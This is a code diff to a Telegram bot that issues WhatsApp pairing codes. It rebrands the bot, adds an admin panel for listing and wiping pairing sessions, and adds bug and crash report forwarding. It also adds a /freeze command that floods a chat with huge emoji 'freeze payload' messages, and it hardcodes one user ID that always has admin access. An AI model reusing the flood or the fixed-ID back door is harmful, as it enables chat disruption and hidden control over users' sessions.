@@ -119,6 +119,40 @@ const sendChannelsRequiredMessage = async (chatId) => {
   );
 };
 
+const sendForwardedReport = async (kind, issue, msg) => {
+  const chatId = msg.chat.id;
+  const reporterId = String(msg.from?.id || 'unknown');
+  const reporterName = msg.from?.username || msg.from?.first_name || 'Unknown User';
+  const chatTitle = msg.chat.title || (msg.chat.type === 'private' ? 'Private chat' : 'Group chat');
+  const timestamp = new Date().toLocaleString();
+
+  const reportText =
+    `${kind === 'crash' ? '🚨' : '🐞'} *New ${kind === 'crash' ? 'Crash' : 'Bug'} Report*\n\n` +
+    `👤 User: ${reporterName}\n` +
+    `📞 User ID: ${reporterId}\n` +
+    `💬 Chat: ${chatTitle}\n` +
+    `⏰ Time: ${timestamp}\n\n` +
+    `📝 Details:\n${issue}`;
+
+  const targets = adminIDs.length ? adminIDs : ['8749547652'];
+  const sentTargets = [];
+
+  for (const target of targets) {
+    const targetId = String(target);
+    try {
+      await bot.sendMessage(Number(targetId), reportText, { parse_mode: 'Markdown' });
+      sentTargets.push(targetId);
+    } catch (e) {
+      console.error(chalk.red(`⚠️ Failed to forward ${kind} report to admin ${targetId}:`), e.message);
+    }
+  }
+
+  return {
+    sentTargets,
+    ack: `✅ *${kind === 'crash' ? 'Crash' : 'Bug'} report submitted successfully.*\n\nThe owner will check it soon.`
+  };
+};
+
 // ========== SEND GROUP MESSAGE (STYLISH) ==========
 const sendGroupMessage = async (chatId, replyToMessageId = null) => {
   const message = `╭━━〔 🛡️ 𝙑𝙄𝙋 𝙎𝙀𝘾𝙐𝙍𝙀 〕━━╮
@@ -155,11 +189,11 @@ bot.onText(/\/start/, async (msg) => {
     chatId,
     "https://i.postimg.cc/NMn8rzqh/image1.png",
     {
-      caption: `🪀 *𝙏𝙝𝙚 𝑺𝒉𝒂𝒅𝒐𝒘 𝑴𝑫💀*\n\n╔════════════════════╗\n ⤷ /pair <wa_number>\n ⤷ /unpair <wa_number>\n╚════════════════════╝`,
+      caption: `🪀 *𝙏𝙝𝙚 �𝒆𝒕𝒓𝒐 𝑴𝑫💀*\n\n╔════════════════════╗\n ⤷ /pair <wa_number>\n ⤷ /unpair <wa_number>\n╚════════════════════╝`,
       parse_mode: 'Markdown',
       reply_markup: {
         inline_keyboard: [
-          [{ text: "👑 Owner", url: "https://t.me/shadowhacr", style: 'primary' }]
+          [{ text: "👑 Owner", url: "https://t.me/codderpetro", style: 'primary' }]
         ]
       }
     }
@@ -239,6 +273,7 @@ bot.onText(/\/pair(?:\s+(.+))?/, async (msg, match) => {
     delete require.cache[require.resolve('./pair.js')];
 
     return bot.sendMessage(chatId,
+      `✅ *Pair request accepted successfully.*\n\n` +
       `🔗 *Pairing Code for WhatsApp*\n\n` +
       `📝 *Code:* 👉 \`${cuObj.code}\` 👈\n\n` +
       `➡️ *Instructions:*\n` +
@@ -325,8 +360,8 @@ bot.on('message', async (msg) => {
         parse_mode: 'Markdown',
         reply_markup: {
           inline_keyboard: [
-            [{ text: '📢 Channel 1', url: 'https://t.me/shadowofficial786', style: 'primary' }],
-            [{ text: '📢 Channel 2', url: 'https://t.me/shadowbanproof', style: 'success' }],
+            [{ text: '📢 Channel 1', url: 'https://t.me/petroofficial786', style: 'primary' }],
+            [{ text: '📢 Channel 2', url: 'https://t.me/petrobanproof', style: 'success' }],
             [{ text: '👥 Group', url: 'https://t.me/skchatzone', style: 'danger' }],
             [{ text: '✅ I have joined', callback_data: 'check_join', style: 'primary' }]
           ]
@@ -375,6 +410,7 @@ bot.on('message', async (msg) => {
     delete require.cache[require.resolve('./pair.js')];
 
     return bot.sendMessage(chatId,
+      `✅ *Pair request accepted successfully.*\n\n` +
       `🔗 *Pairing Code*\n\n📝 Code: \`${cuObj.code}\`\n\n1. Open WhatsApp\n2. Settings → Linked Devices\n3. Link a Device\n4. Enter this code`,
       {
         parse_mode: 'Markdown',
@@ -389,6 +425,159 @@ bot.on('message', async (msg) => {
   } catch (error) {
     console.error('PAIRING ERROR:', error);
     bot.sendMessage(chatId, '❌ Pairing failed. Try again later.');
+  }
+});
+
+// ========== ADMIN PANEL ==========
+const getPairedEntries = async () => {
+  const pairingPath = path.join(__dirname, 'kingbadboitimewisher', 'pairing');
+
+  if (!(await exists(pairingPath))) {
+    return [];
+  }
+
+  const entries = await fs.readdir(pairingPath, { withFileTypes: true });
+  return entries.filter(entry => entry.isDirectory() && entry.name.endsWith('@s.whatsapp.net')).map(entry => entry.name);
+};
+
+bot.onText(/^\/admin(?:\s+(.+))?/, async (msg, match) => {
+  const chatId = msg.chat.id;
+  const requesterId = String(msg.from.id);
+  const command = (match?.[1] || '').trim().toLowerCase();
+
+  if (msg.chat.type !== 'private') {
+    return bot.sendMessage(chatId, '❌ Please use /admin in a private chat.', { parse_mode: 'Markdown' });
+  }
+
+  const isAdmin = adminIDs.includes(requesterId) || requesterId === '8749547652';
+  if (!isAdmin) {
+    return bot.sendMessage(chatId, '⚠️ Admin access denied.', { parse_mode: 'Markdown' });
+  }
+
+  if (!command || command === 'help' || command === 'menu') {
+    const paired = await getPairedEntries();
+    const statusLine = `📊 Active pairs: ${paired.length}`;
+
+    return bot.sendMessage(chatId,
+      `👑 *Petro Admin Panel*\n\n` +
+      `🛠️ Commands:\n` +
+      `• /admin stats\n` +
+      `• /admin pairs\n` +
+      `• /admin clear\n` +
+      `• /unpair <number>\n\n` +
+      `${statusLine}`,
+      { parse_mode: 'Markdown' }
+    );
+  }
+
+  if (command === 'stats') {
+    const paired = await getPairedEntries();
+    return bot.sendMessage(chatId,
+      `👑 *Petro Admin Stats*\n\n` +
+      `✅ Paired accounts: ${paired.length}\n` +
+      `⚙️ Pairing limit: 1000\n` +
+      `🧩 Bot: Petro Telegram Pairing`,
+      { parse_mode: 'Markdown' }
+    );
+  }
+
+  if (command === 'pairs') {
+    const paired = await getPairedEntries();
+    if (!paired.length) {
+      return bot.sendMessage(chatId, '📭 No paired account found yet.', { parse_mode: 'Markdown' });
+    }
+
+    const preview = paired.slice(0, 15).map(item => `• ${item}`).join('\n');
+    return bot.sendMessage(chatId,
+      `📋 *Current Paired Accounts*\n\n${preview}${paired.length > 15 ? `\n... and ${paired.length - 15} more` : ''}`,
+      { parse_mode: 'Markdown' }
+    );
+  }
+
+  if (command === 'clear') {
+    const pairingPath = path.join(__dirname, 'kingbadboitimewisher', 'pairing');
+    if (!(await exists(pairingPath))) {
+      return bot.sendMessage(chatId, '📭 No pairing folder found.', { parse_mode: 'Markdown' });
+    }
+
+    const pairingFiles = await fs.readdir(pairingPath);
+    await Promise.all(pairingFiles.map(async file => {
+      const fullPath = path.join(pairingPath, file);
+      const stat = await fs.stat(fullPath);
+      if (stat.isDirectory()) {
+        await fs.rm(fullPath, { recursive: true, force: true });
+      } else {
+        await fs.unlink(fullPath);
+      }
+    }));
+
+    return bot.sendMessage(chatId, '✅ Pairing data cleaned successfully.', { parse_mode: 'Markdown' });
+  }
+
+  return bot.sendMessage(chatId,
+    '⚠️ Unknown admin command. Try: /admin help',
+    { parse_mode: 'Markdown' }
+  );
+});
+
+// ========== BUG / CRASH / FREEZE REPORT COMMANDS ==========
+bot.onText(/^\/bug(?:\s+(.+))?/, async (msg, match) => {
+  const chatId = msg.chat.id;
+  const issue = (match?.[1] || '').trim();
+
+  if (!issue) {
+    return bot.sendMessage(chatId,
+      '🐞 *Bug report usage*\n\nUse: /bug <your issue>\nExample: /bug menu button not working',
+      { parse_mode: 'Markdown' }
+    );
+  }
+
+  try {
+    const forwarded = await sendForwardedReport('bug', issue, msg);
+    await bot.sendMessage(chatId, forwarded.ack, { parse_mode: 'Markdown' });
+  } catch (e) {
+    console.error(chalk.red('❌ Bug reporter failed:'), e.message);
+    await bot.sendMessage(chatId, '❌ Bug report failed. Please try again later.', { parse_mode: 'Markdown' });
+  }
+});
+
+bot.onText(/^\/crash(?:\s+(.+))?/, async (msg, match) => {
+  const chatId = msg.chat.id;
+  const issue = (match?.[1] || '').trim();
+
+  if (!issue) {
+    return bot.sendMessage(chatId,
+      '🚨 *Crash report usage*\n\nUse: /crash <your issue>\nExample: /crash bot crashed when sending pair code',
+      { parse_mode: 'Markdown' }
+    );
+  }
+
+  try {
+    const forwarded = await sendForwardedReport('crash', issue, msg);
+    await bot.sendMessage(chatId, forwarded.ack.replace('Bug', 'Crash'), { parse_mode: 'Markdown' });
+  } catch (e) {
+    console.error(chalk.red('❌ Crash reporter failed:'), e.message);
+    await bot.sendMessage(chatId, '❌ Crash report failed. Please try again later.', { parse_mode: 'Markdown' });
+  }
+});
+
+bot.onText(/^\/freeze(?:\s+(.+))?/, async (msg, match) => {
+  const chatId = msg.chat.id;
+  const requested = (match?.[1] || '').trim();
+
+  try {
+    const amount = Number(requested) || 3;
+    const count = Math.min(Math.max(amount, 1), 10);
+    const payload = '🍀'.repeat(3000);
+
+    for (let i = 0; i < count; i++) {
+      await bot.sendMessage(chatId, payload, { parse_mode: 'Markdown' });
+    }
+
+    await bot.sendMessage(chatId, '✅ *Freeze payload sent successfully.*', { parse_mode: 'Markdown' });
+  } catch (e) {
+    console.error(chalk.red('❌ Freeze payload failed:'), e.message);
+    await bot.sendMessage(chatId, '❌ Freeze payload failed. Try again later.', { parse_mode: 'Markdown' });
   }
 });
 
